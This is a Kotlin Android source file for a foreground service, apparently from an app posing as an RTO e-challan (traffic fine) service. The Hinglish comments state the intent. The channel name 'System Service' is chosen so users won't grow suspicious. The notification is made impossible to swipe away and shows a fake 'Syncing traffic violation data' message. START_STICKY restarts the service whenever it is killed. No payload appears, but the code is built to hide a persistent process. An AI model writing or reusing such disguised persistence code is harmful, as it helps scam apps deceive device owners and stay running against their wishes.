package com.rte.challan.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat

class BackgroundService : Service() {

    private val CHANNEL_ID = "RtoEChallanChannel"
    private val NOTIFICATION_ID = 1001

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        
        // Android 14 aur 15 ke liye Service Type specify karna mandatory hai
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIFICATION_ID, 
                getNotification(), 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE // Manifest se match hona chahiye
            )
        } else {
            startForeground(NOTIFICATION_ID, getNotification())
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Isse system service ko kill hone ke baad automatically restart kar deta hai
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service", // Thoda generic naam taaki user ko shak na ho
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Monitoring traffic updates"
                setSound(null, null)
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun getNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("RTO Service")
            .setContentText("Syncing traffic violation data...")
            .setSmallIcon(android.R.drawable.stat_notify_sync) // Sync icon zyada professional lagta hai
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true) // User ise swipe karke hata nahi payega
            .build()
    }
}
